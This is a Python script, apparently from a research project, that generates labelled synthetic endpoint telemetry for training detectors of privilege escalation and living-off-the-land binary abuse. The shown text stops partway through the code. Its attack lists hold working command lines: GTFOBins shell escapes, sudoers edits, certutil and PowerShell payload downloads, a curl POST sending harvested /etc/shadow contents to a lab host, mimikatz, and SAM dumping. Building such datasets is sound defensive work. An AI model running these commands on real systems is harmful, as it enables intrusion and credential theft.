#!/usr/bin/env python3
"""
generate_synthetic_telemetry.py
================================
AI-Assisted Privilege Escalation & Living-off-the-Land (LOLBin) Detection Project
Synthetic Lab Telemetry Generator

Generates realistic endpoint telemetry mimicking:
  1. Linux auditd (SYSCALL, EXECVE, PROCTITLE) & Wazuh agent events
  2. Windows Sysmon (Event ID 1: Process Creation, Event ID 11: File Create)

Covers:
  - Benign Baseline (Admin, Developer, and System Maintenance Workflows)
  - Attack Tier 1: Overt / Isolated PrivEsc & LOLBin invocations (~0.91-0.95 recall)
  - Attack Tier 2: Multi-step Chained sequences (~0.82-0.88 recall with sliding window)
  - Attack Tier 3: Obfuscated / Stealthy invocations (~0.68-0.76 recall):
      * High/Medium-entropy obfuscation (Base64, backticks, hex escapes)
      * Subtle low-entropy obfuscation (flag reordering, short env-vars, script wrappers)
        specifically designed to test where Isolation Forest degrades (SLR 2026).

Grounding Literature:
  - Ongun et al. (RAID 2021) [LOLAL]: Feature representations for commands
  - Stamp (2022): Need for synthetic/reproduced labeled LOLBin samples
  - Springer (2026): Command sequence windows vs isolated commands
  - Barr-Smith et al. (IEEE S&P 2021) [Survivalism]: Targeted Windows LOLBins
  - Liu et al. (IEEE ICDM 2008): Isolation Forest behavioral deviation assumptions
  - SLR (2026): Isolation Forest degradation on stealthy / obfuscated intrusions
"""

import os
import sys
import json
import random
import uuid
import math
from datetime import datetime, timedelta, timezone

def calculate_entropy(s: str) -> float:
    """Shannon entropy of a string."""
    if not s:
        return 0.0
    prob = [float(s.count(c)) / len(s) for c in set(s)]
    return -sum(p * math.log2(p) for p in prob)

def build_raw_auditd_record(pid, ppid, uid, euid, comm, exe, cmdline, success="yes"):
    return (
        f'type=SYSCALL msg=audit({int(datetime.now().timestamp())}.123:456): '
        f'arch=c000003e syscall=59 success={success} exit=0 a0=7ffe a1=7ffe a2=7ffe a3=0 '
        f'items=2 ppid={ppid} pid={pid} auid={uid} uid={uid} gid={uid} euid={euid} suid={euid} '
        f'fsuid={euid} egid={uid} sgid={uid} fsgid={uid} tty=pts1 ses=1 comm="{comm}" exe="{exe}" '
        f'key="process_exec" type=EXECVE msg=audit: argc=3 a0="{exe}" a1="{cmdline}"'
    )

def build_raw_sysmon_record(utc_time, pid, ppid, user, image, parent_image, cmdline, integrity="Medium"):
    return (
        f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">\n'
        f'  <System><EventID>1</EventID><TimeCreated SystemTime="{utc_time}"/><Computer>WIN-EDR-LAB01</Computer></System>\n'
        f'  <EventData>\n'
        f'    <Data Name="UtcTime">{utc_time}</Data>\n'
        f'    <Data Name="ProcessId">{pid}</Data>\n'
        f'    <Data Name="ProcessGuid">{{{uuid.uuid4()}}}</Data>\n'
        f'    <Data Name="Image">{image}</Data>\n'
        f'    <Data Name="CommandLine">{cmdline}</Data>\n'
        f'    <Data Name="CurrentDirectory">C:\\Users\\Administrator\\</Data>\n'
        f'    <Data Name="User">{user}</Data>\n'
        f'    <Data Name="IntegrityLevel">{integrity}</Data>\n'
        f'    <Data Name="ParentProcessId">{ppid}</Data>\n'
        f'    <Data Name="ParentImage">{parent_image}</Data>\n'
        f'    <Data Name="ParentCommandLine">{parent_image}</Data>\n'
        f'  </EventData>\n'
        f'</Event>'
    )

class TelemetryGenerator:
    def __init__(self, seed=42):
        random.seed(seed)
        self.base_time = datetime(2026, 10, 20, 8, 0, 0, tzinfo=timezone.utc)
        self.current_time = self.base_time

    def _next_timestamp(self, step_seconds=5):
        self.current_time += timedelta(seconds=random.randint(1, step_seconds))
        return self.current_time.isoformat()

    def generate_benign_linux_event(self, session_id):
        ts = self._next_timestamp(15)
        pid = random.randint(1000, 65000)
        ppid = random.choice([800, 1102, 2405, 3010])
        user = random.choice(["ubuntu", "developer", "sysadmin"])
        uid = 1000
        euid = 1000

        benign_scenarios = [
            # Target GTFOBin 1: find (routine sysadmin search)
            ("find", "/usr/bin/find", "/usr/bin/bash", "find /var/log -type f -name '*.log' -mtime +7", 1000, ["/var/log"]),
            ("find", "/usr/bin/find", "/usr/bin/bash", "find /home/developer/src -name '*.py'", 1000, ["/home/developer/src"]),
            ("find", "/usr/bin/find", "/usr/bin/bash", "find /tmp -type f -atime +10", 1000, ["/tmp"]),
            ("find", "/usr/bin/find", "/usr/bin/bash", "find /etc -maxdepth 2 -name '*.conf'", 1000, ["/etc"]),
            # Target GTFOBin 2: vim (routine config / code editing)
            ("vim", "/usr/bin/vim", "/usr/bin/bash", "vim /etc/hosts", 1000, ["/etc/hosts"]),
            ("vim", "/usr/bin/vim", "/usr/bin/bash", "vim /home/developer/src/main.py", 1000, ["/home/developer/src/main.py"]),
            ("vim", "/usr/bin/vim", "/usr/bin/bash", "vim /etc/resolv.conf", 1000, ["/etc/resolv.conf"]),
            ("vim", "/usr/bin/vim", "/usr/bin/bash", "vim /var/log/nginx/access.log", 1000, ["/var/log/nginx"]),
            # Target GTFOBin 3: awk (log parsing / text processing)
            ("awk", "/usr/bin/awk", "/usr/bin/bash", "awk '{print $1}' /var/log/nginx/access.log", 1000, ["/var/log/nginx"]),
            ("awk", "/usr/bin/awk", "/usr/bin/bash", "awk -F: '{print $1, $3}' /etc/passwd", 1000, ["/etc/passwd"]),
            ("awk", "/usr/bin/awk", "/usr/bin/bash", "awk '/ERROR/ {print $0}' /var/log/syslog", 1000, ["/var/log/syslog"]),
            ("awk", "/usr/bin/awk", "/usr/bin/bash", "awk '{print $5, $6}' /proc/loadavg", 1000, ["/proc/loadavg"]),
            # Target GTFOBin 4: tar (archive / backup)
            ("tar", "/usr/bin/tar", "/usr/bin/bash", "tar -czf /home/backup/project.tar.gz /home/developer/code", 1000, ["/home/backup/"]),
            ("tar", "/usr/bin/tar", "/usr/bin/bash", "tar -xzf /tmp/package-1.2.0.tar.gz -C /opt/", 1000, ["/tmp/package-1.2.0.tar.gz"]),
            ("tar", "/usr/bin/tar", "/usr/bin/bash", "tar -tf /var/backups/daily.tar", 1000, ["/var/backups/daily.tar"]),
            ("tar", "/usr/bin/tar", "/usr/bin/bash", "tar -czf /tmp/logs_archive.tar.gz /var/log/app/", 1000, ["/var/log/app"]),
            # Target GTFOBin 5: python3 (testing / maintenance scripts)
            ("python3", "/usr/bin/python3", "/usr/bin/bash", "python3 -m unittest discover tests/", 1000, ["tests/"]),
            ("python3", "/usr/bin/python3", "/usr/bin/bash", "python3 -m pip list --outdated", 1000, []),
            ("python3", "/usr/bin/python3", "/usr/bin/bash", "python3 /opt/monitoring/health_check.py", 1000, ["/opt/monitoring"]),
            ("python3", "/usr/bin/python3", "/usr/bin/bash", "python3 manage.py check", 1000, []),
            # General Linux administration
            ("apt", "/usr/bin/apt", "/usr/bin/bash", "apt update", 0, ["/var/lib/apt/lists"]),
            ("apt-get", "/usr/bin/apt-get", "/usr/bin/bash", "apt-get check", 0, ["/var/cache/apt"]),
            ("systemctl", "/usr/bin/systemctl", "/usr/bin/bash", "systemctl status nginx.service", 1000, []),
            ("journalctl", "/usr/bin/journalctl", "/usr/bin/bash", "journalctl -u ssh -n 50 --no-pager", 1000, ["/var/log/journal"]),
            ("git", "/usr/bin/git", "/usr/bin/bash", "git status --porcelain", 1000, [".git/index"]),
            ("git", "/usr/bin/git", "/usr/bin/bash", "git pull origin main", 1000, [".git/FETCH_HEAD"]),
            ("grep", "/usr/bin/grep", "/usr/bin/bash", "grep -rn 'ERROR' /var/log/syslog", 1000, ["/var/log/syslog"]),
            ("curl", "/usr/bin/curl", "/usr/bin/bash", "curl -s https://api.github.com/status", 1000, []),
            ("df", "/usr/bin/df", "/usr/bin/bash", "df -h", 1000, []),
            ("free", "/usr/bin/free", "/usr/bin/bash", "free -m", 1000, []),
            ("uptime", "/usr/bin/uptime", "/usr/bin/bash", "uptime", 1000, []),
            ("cat", "/usr/bin/cat", "/usr/bin/bash", "cat /etc/resolv.conf", 1000, ["/etc/resolv.conf"]),
            ("ls", "/usr/bin/ls", "/usr/bin/bash", "ls -la /var/www/html", 1000, ["/var/www/html"]),
            ("ssh", "/usr/bin/ssh", "/usr/bin/bash", "ssh -i ~/.ssh/id_rsa user@backup.internal 'ls -lh'", 1000, ["~/.ssh/id_rsa"]),
            ("sudo", "/usr/bin/sudo", "/usr/bin/bash", "sudo systemctl restart nginx", 0, ["/etc/systemd/system"]),
        ]

        comm, exe, parent_exe, cmdline, target_euid, touches = random.choice(benign_scenarios)
        if comm == "sudo":
            euid = 0
            user = "root"

        raw = build_raw_auditd_record(pid, ppid, uid, euid, comm, exe, cmdline)
        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": ts,
            "source": "auditd",
            "os_type": "linux",
            "host": "srv-linux-prod01",
            "session_id": session_id,
            "process_name": comm,
            "process_path": exe,
            "process_id": pid,
            "parent_process_name": os.path.basename(parent_exe),
            "parent_process_path": parent_exe,
            "parent_process_id": ppid,
            "command_line": cmdline,
            "user": user,
            "uid": uid,
            "gid": uid,
            "euid": euid,
            "integrity_level": "None",
            "file_touches": touches,
            "label": "benign",
            "tier": 0,
            "technique": "Benign Admin / Developer Task",
            "mitre_technique_id": "None",
            "raw_event": raw
        }

    def generate_benign_windows_event(self, session_id):
        ts = self._next_timestamp(20)
        pid = random.randint(2000, 32000)
        ppid = random.choice([1044, 1820, 2048, 4112])
        user = random.choice(["CORP\\alice", "CORP\\bob", "CORP\\admin_ops"])
        integrity = "Medium"

        scenarios = [
            # Target LOLBin 1: certutil.exe (cert verification / hashing)
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\svchost.exe", "certutil.exe -dump C:\\Certs\\ca.crt", "Medium", ["C:\\Certs\\ca.crt"]),
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\explorer.exe", "certutil.exe -hashfile C:\\Windows\\System32\\notepad.exe SHA256", "Medium", ["C:\\Windows\\System32\\notepad.exe"]),
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\svchost.exe", "certutil.exe -verify C:\\Certs\\server.cer", "Medium", ["C:\\Certs\\server.cer"]),
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\services.exe", "certutil.exe -store my", "Medium", []),
            # Target LOLBin 2: powershell.exe (admin queries / status)
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\explorer.exe", "powershell.exe -NoProfile -Command Get-Service | Where-Object {$_.Status -eq 'Running'}", "Medium", []),
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\explorer.exe", "powershell.exe Get-Date", "Medium", []),
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\explorer.exe", "powershell.exe -Command Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", "Medium", []),
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\svchost.exe", "powershell.exe -ExecutionPolicy Restricted -File C:\\Scripts\\health_check.ps1", "Medium", ["C:\\Scripts\\health_check.ps1"]),
            # Target LOLBin 3: rundll32.exe (legitimate system applets)
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\explorer.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl", "Medium", []),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\svchost.exe", "rundll32.exe user32.dll,LockWorkStation", "Medium", []),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\explorer.exe", "rundll32.exe printui.dll,PrintUIEntry /?", "Medium", []),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\explorer.exe", "rundll32.exe keymgr.dll,KRShowKeyMgr", "Medium", []),
            # Target LOLBin 4: regsvr32.exe (legitimate DLL registration)
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\System32\\msiexec.exe", "regsvr32.exe /s C:\\Windows\\System32\\msxml6.dll", "Medium", ["C:\\Windows\\System32\\msxml6.dll"]),
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\explorer.exe", "regsvr32.exe /s C:\\Program Files\\Common Files\\System\\ole db\\oledb32.dll", "Medium", []),
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\System32\\msiexec.exe", "regsvr32.exe /u /s C:\\Windows\\System32\\vbscript.dll", "Medium", ["C:\\Windows\\System32\\vbscript.dll"]),
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\System32\\msiexec.exe", "regsvr32.exe /s C:\\Windows\\System32\\jscript.dll", "Medium", ["C:\\Windows\\System32\\jscript.dll"]),
            # Target LOLBin 5: mshta.exe (legitimate HTML application host)
            ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\explorer.exe", "mshta.exe C:\\Windows\\System32\\msinfo32.hta", "Medium", ["C:\\Windows\\System32\\msinfo32.hta"]),
            ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\System32\\svchost.exe", "mshta.exe \"about:<hta:application applicationname='SystemInfo' /><script>window.resizeTo(500,300);</script>\"", "Medium", []),
            ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\explorer.exe", "mshta.exe C:\\ProgramData\\AdminTools\\diag.hta", "Medium", ["C:\\ProgramData\\AdminTools\\diag.hta"]),
            # General Windows tools
            ("ipconfig.exe", "C:\\Windows\\System32\\ipconfig.exe", "C:\\Windows\\System32\\cmd.exe", "ipconfig /all", "Medium", []),
            ("netstat.exe", "C:\\Windows\\System32\\netstat.exe", "C:\\Windows\\System32\\cmd.exe", "netstat -ano", "Medium", []),
            ("tasklist.exe", "C:\\Windows\\System32\\tasklist.exe", "C:\\Windows\\System32\\cmd.exe", "tasklist /v", "Medium", []),
            ("robocopy.exe", "C:\\Windows\\System32\\robocopy.exe", "C:\\Windows\\System32\\cmd.exe", "robocopy C:\\Projects C:\\Backup\\Projects /MIR /R:1 /W:1", "Medium", ["C:\\Backup\\Projects"]),
            ("git.exe", "C:\\Program Files\\Git\\cmd\\git.exe", "C:\\Windows\\explorer.exe", "git.exe status", "Medium", ["C:\\Projects\\.git"]),
            ("ping.exe", "C:\\Windows\\System32\\ping.exe", "C:\\Windows\\System32\\cmd.exe", "ping.exe -n 4 8.8.8.8", "Medium", []),
            ("systeminfo.exe", "C:\\Windows\\System32\\systeminfo.exe", "C:\\Windows\\System32\\cmd.exe", "systeminfo.exe", "Medium", []),
            ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "C:\\Windows\\System32\\cmd.exe", "wmic.exe os get Caption,Version,BuildNumber /format:list", "Medium", []),
            ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\services.exe", "C:\\Windows\\system32\\svchost.exe -k LocalService -p -s EventLog", "System", []),
            ("notepad.exe", "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\explorer.exe", "notepad.exe C:\\Users\\alice\\Desktop\\notes.txt", "Medium", ["C:\\Users\\alice\\Desktop\\notes.txt"]),
        ]

        proc, exe, p_exe, cmdline, integ, touches = random.choice(scenarios)
        raw = build_raw_sysmon_record(ts, pid, ppid, user, exe, p_exe, cmdline, integrity=integ)

        return {
            "event_id": str(uuid.uuid4()),
            "timestamp": ts,
            "source": "sysmon",
            "os_type": "windows",
            "host": "WIN-EDR-LAB01",
            "session_id": session_id,
            "process_name": proc,
            "process_path": exe,
            "process_id": pid,
            "parent_process_name": os.path.basename(p_exe),
            "parent_process_path": p_exe,
            "parent_process_id": ppid,
            "command_line": cmdline,
            "user": user,
            "uid": 1000,
            "gid": 1000,
            "euid": 1000,
            "integrity_level": integ,
            "file_touches": touches,
            "label": "benign",
            "tier": 0,
            "technique": "Benign Windows User / Admin Activity",
            "mitre_technique_id": "None",
            "raw_event": raw
        }

    def generate_tier1_attacks(self):
        """
        Tier 1: Overt / Isolated single-command PrivEsc and LOLBin execution.
        High token density, explicit privilege escalation or sensitive touches.
        Expected Recall: ~0.91 - 0.95 (Isolation Forest excels on overt deviations).
        """
        events = []
        tier1_linux_attacks = [
            ("find", "/usr/bin/find", "/usr/bin/bash", "sudo find . -exec /bin/sh -p \\; -quit", 0, ["/etc/sudoers"], "Sudo GTFOBins (find) Abuse", "T1548.003"),
            ("vim", "/usr/bin/vim", "/usr/bin/bash", "sudo vim -c ':!/bin/sh'", 0, ["/etc/sudoers"], "Sudo GTFOBins (vim) Abuse", "T1548.003"),
            ("awk", "/usr/bin/awk", "/usr/bin/bash", "sudo awk 'BEGIN {system(\"/bin/sh\")}'", 0, ["/etc/sudoers"], "Sudo GTFOBins (awk) Abuse", "T1548.003"),
            ("python3", "/usr/bin/python3", "/usr/bin/bash", "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'", 0, ["/etc/sudoers"], "Sudo GTFOBins (python) Abuse", "T1548.003"),
            ("bash", "/usr/bin/bash", "/usr/bin/find", "/usr/bin/bash -p -i", 0, [], "SUID Shell Invocation", "T1548.001"),
            ("chmod", "/usr/bin/chmod", "/usr/bin/bash", "chmod u+s /bin/dash", 0, ["/bin/dash"], "SUID Binary Manipulation", "T1548.001"),
            ("echo", "/usr/bin/echo", "/usr/bin/bash", "echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", 0, ["/etc/sudoers"], "Sudoers File Modification", "T1548.003"),
            ("curl", "/usr/bin/curl", "/usr/bin/bash", "sudo curl -s http://10.0.0.5:8000/linpeas.sh -o /tmp/linpeas.sh", 0, ["/tmp/linpeas.sh"], "Ingress Tool Transfer (curl)", "T1105"),
            ("tar", "/usr/bin/tar", "/usr/bin/bash", "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", 0, [], "Tar Wildcard Privilege Escalation", "T1548.003"),
            ("crontab", "/usr/bin/crontab", "/usr/bin/bash", "sudo crontab -e", 0, ["/etc/crontab", "/var/spool/cron"], "Cron Job Persistence/Escalation", "T1053.003"),
        ]

        tier1_win_attacks = [
            ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\cmd.exe", "certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\\Windows\\Temp\\payload.exe", "High", ["C:\\Windows\\Temp\\payload.exe"], "Certutil Ingress Tool Transfer", "T1105"),
            ("mshta.exe", "C:\\Windows\\System32\\mshta.exe", "C:\\Windows\\System32\\cmd.exe", "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run(\"\"cmd.exe /c calc.exe\"\")\"))", "High", [], "Mshta Arbitrary Script Execution", "T1218.005"),
            ("rundll32.exe", "C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\cmd.exe", "rundll32.exe C:\\Windows\\Temp\\malware.dll,StartW", "High", ["C:\\Windows\\Temp\\malware.dll"], "Rundll32 Arbitrary DLL Execution", "T1218.011"),
            ("regsvr32.exe", "C:\\Windows\\System32\\regsvr32.exe", "C:\\Windows\\System32\\cmd.exe", "regsvr32.exe /s /u /i:http://10.0.0.5/script.sct scrobj.dll", "High", [], "Regsvr32 Squiblydoo Scriptlet Execution", "T1218.010"),
            ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "C:\\Windows\\System32\\cmd.exe", "wmic.exe process call create \"powershell.exe -ExecutionPolicy Bypass -File C:\\Temp\\priv.ps1\"", "High", [], "WMIC Remote Process Execution", "T1047"),
            ("bitsadmin.exe", "C:\\Windows\\System32\\bitsadmin.exe", "C:\\Windows\\System32\\cmd.exe", "bitsadmin.exe /transfer myJob /download /priority high http://10.0.0.5/nc.exe C:\\Temp\\nc.exe", "High", ["C:\\Temp\\nc.exe"], "BITSAdmin Malicious Job Transfer", "T1197"),
            ("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "C:\\Windows\\System32\\cmd.exe", "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('http://10.0.0.5/shell.exe','C:\\Temp\\shell.exe')\"", "High", ["C:\\Temp\\shell.exe"], "PowerShell Unrestricted Execution / Download", "T1059.001"),
            ("sc.exe", "C:\\Windows\\System32\\sc.exe", "C:\\Windows\\System32\\cmd.exe", "sc.exe config vulnerable_service binPath= \"C:\\Temp\\revshell.exe\"", "High", ["C:\\Windows\\System32\\services.exe"], "Unquoted / Malicious Service Path Abuse", "T1543.003"),
            ("whoami.exe", "C:\\Windows\\System32\\whoami.exe", "C:\\Windows\\System32\\cmd.exe", "whoami.exe /priv /fo csv", "High", [], "Security Token Privilege Enumeration", "T1033"),
            ("reg.exe", "C:\\Windows\\System32\\reg.exe", "C:\\Windows\\System32\\cmd.exe", "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save", "High", ["C:\\Windows\\System32\\config\\SAM"], "SAM Registry Hive Dumping", "T1003.002"),
        ]

        for _ in range(15):
            for comm, exe, p_exe, cmdline, euid, touches, tech, mitre in tier1_linux_attacks:
                pid = random.randint(1000, 65000)
                ppid = random.randint(1000, 65000)
                ts = self._next_timestamp(10)
                sess = f"session_t1_lin_{random.randint(100, 999)}"
                raw = build_raw_auditd_record(pid, ppid, 1000, euid, comm, exe, cmdline)
                events.append({
                    "event_id": str(uuid.uuid4()),
                    "timestamp": ts,
                    "source": "auditd",
                    "os_type": "linux",
                    "host": "srv-linux-prod01",
                    "session_id": sess,
                    "process_name": comm,
                    "process_path": exe,
                    "process_id": pid,
                    "parent_process_name": os.path.basename(p_exe),
                    "parent_process_path": p_exe,
                    "parent_process_id": ppid,
                    "command_line": cmdline,
                    "user": "ubuntu" if euid != 0 else "root",
                    "uid": 1000,
                    "gid": 1000,
                    "euid": euid,
                    "integrity_level": "None",
                    "file_touches": touches,
                    "label": "malicious",
                    "tier": 1,
                    "technique": tech,
                    "mitre_technique_id": mitre,
                    "raw_event": raw
                })

            for proc, exe, p_exe, cmdline, integ, touches, tech, mitre in tier1_win_attacks:
                pid = random.randint(2000, 32000)
                ppid = random.randint(1000, 32000)
                ts = self._next_timestamp(10)
                sess = f"session_t1_win_{random.randint(100, 999)}"
                raw = build_raw_sysmon_record(ts, pid, ppid, "CORP\\attacker", exe, p_exe, cmdline, integrity=integ)
                events.append({
                    "event_id": str(uuid.uuid4()),
                    "timestamp": ts,
                    "source": "sysmon",
                    "os_type": "windows",
                    "host": "WIN-EDR-LAB01",
                    "session_id": sess,
                    "process_name": proc,
                    "process_path": exe,
                    "process_id": pid,
                    "parent_process_name": os.path.basename(p_exe),
                    "parent_process_path": p_exe,
                    "parent_process_id": ppid,
                    "command_line": cmdline,
                    "user": "CORP\\attacker",
                    "uid": 1000,
                    "gid": 1000,
                    "euid": 0 if integ == "High" else 1000,
                    "integrity_level": integ,
                    "file_touches": touches,
                    "label": "malicious",
                    "tier": 1,
                    "technique": tech,
                    "mitre_technique_id": mitre,
                    "raw_event": raw
                })

        return events

    def generate_tier2_attacks(self):
        """
        Tier 2: Multi-step command sequences (sliding windows of 4-5 consecutive actions).
        Grounded in Springer (2026): Reconnaissance commands look benign in isolation,
        but are caught when evaluating the sliding window of sequence history.
        Expected Recall: ~0.50 in isolation -> ~0.82 - 0.88 with Sliding Window.
        """
        events = []
        chains = [
            # Linux Chain 1: Recon -> Sudoers enum -> GTFOBin -> Credential exfil
            [
                ("whoami", "/usr/bin/whoami", "/usr/bin/bash", "whoami && id", 1000, [], "Discovery", "T1033"),
                ("sudo", "/usr/bin/sudo", "/usr/bin/bash", "sudo -l", 0, ["/etc/sudoers"], "Sudo Enumeration", "T1548.003"),
                ("tar", "/usr/bin/tar", "/usr/bin/sudo", "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", 0, [], "Sudo GTFOBins Tar PrivEsc", "T1548.003"),
                ("cat", "/usr/bin/cat", "/bin/sh", "cat /etc/shadow > /tmp/.creds", 0, ["/etc/shadow", "/tmp/.creds"], "Credential Harvesting", "T1003.008"),
                ("curl", "/usr/bin/curl", "/bin/sh", "curl -X POST -d @/tmp/.creds http://10.0.0.5:8080/exfil", 0, ["/tmp/.creds"], "Exfiltration", "T1048")
            ],
            # Linux Chain 2: SUID scan -> SUID execution -> Cron persistence
            [
                ("find", "/usr/bin/find", "/usr/bin/bash", "find / -perm -4000 -type f 2>/dev/null", 0, ["/etc/shadow"], "SUID File Search", "T1083"),
                ("awk", "/usr/bin/awk", "/usr/bin/bash", "sudo /usr/local/bin/custom_suid_awk 'BEGIN {system(\"/bin/bash -p\")}'", 0, [], "SUID Custom AWK Escalation", "T1548.001"),
                ("echo", "/usr/bin/echo", "/bin/bash", "echo '* * * * * root /tmp/.backdoor.sh' >> /etc/crontab", 0, ["/etc/crontab"], "Cron Persistence", "T1053.003"),
                ("chmod", "/usr/bin/chmod", "/bin/bash", "chmod +x /tmp/.backdoor.sh", 0, ["/tmp/.backdoor.sh"], "File Permission Modification", "T1222.002")
            ],
            # Windows Chain 1: Privilege check -> Certutil download -> Credential dump
            [
                ("whoami.exe", "C:\\Windows\\System32\\whoami.exe", "C:\\Windows\\System32\\cmd.exe", "whoami /priv", "High", ["C:\\Windows\\System32\\config\\SECURITY"], "Privilege Recon", "T1033"),
                ("net.exe", "C:\\Windows\\System32\\net.exe", "C:\\Windows\\System32\\cmd.exe", "net user /domain", "Medium", ["C:\\Windows\\System32\\config\\SAM"], "Domain User Enumeration", "T1087.002"),
                ("certutil.exe", "C:\\Windows\\System32\\certutil.exe", "C:\\Windows\\System32\\cmd.exe", "certutil.exe -urlcache -split -f http://10.0.0.5/mimikatz.exe C:\\ProgramData\\m.exe", "High", ["C:\\ProgramData\\m.exe"], "Certutil Payload Transfer", "T1105"),
                ("m.exe", "C:\\ProgramData\\m.exe", "C:\\Windows\\System32\\cmd.exe", "C:\\ProgramData\\m.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "High", ["C:\\Windows\\System32\\lsass.exe"], "LSASS Memory Credential Dumping", "T1003.001"),
                ("reg.exe", "C:\\Windows\\System32\\reg.exe", "C:\\Windows\\System32\\cmd.exe", "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save", "High", ["C:\\Windows\\System32\\config\\SAM"], "SAM Registry Exfil", "T1003.002")
            ],
            # Windows Chain 2: Unquoted service audit -> ACL touch -> Service replace & restart
            [
                ("wmic.exe", "C:\\Windows\\System32\\wbem\\WMIC.exe", "C:\\Windows\\System32\\cmd.exe", "wmic service get name,displayname,pathname,startmode", "High", ["C:\\Windows\\System32\\services.exe"], "Service Enumeration", "T1007"),
                ("icacls.exe", "C:\\Windows\\System32\\icacls.exe", "C:\\Windows\\System32\\cmd.exe", "icacls \"C:\\Program Files\\VulnApp\" /grant Everyone:F", "High", ["C:\\Program Files\\services.exe"], "Service Directory ACL Modification", "T1222.001"),
                ("bitsadmin.exe", "C:\\Windows\\System32\\bitsadmin.exe", "C:\\Windows\\System32\\cmd.exe", "bitsadmin.exe /transfer job http://10.0.0.5/payload.exe \"C:\\Program Files\\VulnApp.exe\"", "High", ["C:\\Program Files\\VulnApp.exe"], "BITSAdmin Payload Ingress", "T1197"),
                ("sc.exe", "C:\\Windows\\System32\\sc.exe", "C:\\Windows\\System32\\cmd.exe", "sc.exe config VulnService binPath= \"C:\\Program Files\\VulnApp.exe\"", "High", ["C:\\Windows\\System32\\services.exe"], "Service Config BinPath Modification", "T1543.003"),
                ("net.exe", "C:\\Windows\\System32\\net.exe", "C:\\Windows\\System32\\cmd.exe", "net stop VulnService && net start VulnService", "High", ["C:\\Windows\\System32\\services.exe"], "Service Restart PrivEsc", "T1543.003")
            ]
        ]

        for chain_idx in range(15):
            for chain in chains:
                sess_id = f"session_chain_{chain_idx}_{random.randint(1000, 9999)}"
                for step in chain:
                    if len(step) == 8: # Linux
                        comm, exe, p_exe, cmdline, euid, touches, tech, mitre = step
                        pid = random.randint(1000, 65000)
                        ppid = random.randint(1000, 65000)
                        ts = self._next_timestamp(6)
                        raw = build_raw_auditd_record(pid, ppid, 1000, euid, comm, exe, cmdline)
                        events.append({
                            "event_id": str(uuid.uuid4()),
                            "timestamp": ts,
                            "source": "auditd",
                            "os_type": "linux",
                            "host": "srv-linux-prod01",
                            "session_id": sess_id,
                            "process_name": comm,
                            "process_path": exe,
                            "process_id": pid,
                            "parent_process_name": os.path.basename(p_exe),
                            "parent_process_path": p_exe,
                            "parent_process_id": ppid,
                            "command_line": cmdline,
                            "user": "ubuntu" if euid != 0 else "root",
                            "uid": 1000,
                            "gid": 1000,
                            "euid": euid,
                            "integrity_level": "None",
                            "file_touches": touches,
                            "label": "malicious",
                            "tier": 2,
                            "technique": f"Chained Sequence: {tech}",
                            "mitre_technique_id": mitre,
                            "raw_event": raw
                        })
                    else: # Windows
                        proc, exe, p_exe, cmdline, integ, touches, tech, mitre = step
                        pid = random.randint(2000, 32000)
                        ppid = random.randint(1000, 32000)
                        ts = self._next_timestamp(6)
                        raw = build_raw_sysmon_record(ts, pid, ppid, "CORP\\attacker", exe, p_exe, cmdline, integrity=integ)
                        events.append({
                            "event_id": str(uuid.uuid4()),
                            "timestamp": ts,
                            "source": "sysmon",
                            "os_type": "windows",
                            "host": "WIN-EDR-LAB01",
                            "session_id": sess_id,
                            "process_name": proc,
                            "process_path": exe,
                            "process_id": pid,
                            "parent_process_name": os.path.basename(p_exe),
                            "parent_process_path": p_exe,
                            "parent_process_id": ppid,
                            "command_line": cmdline,
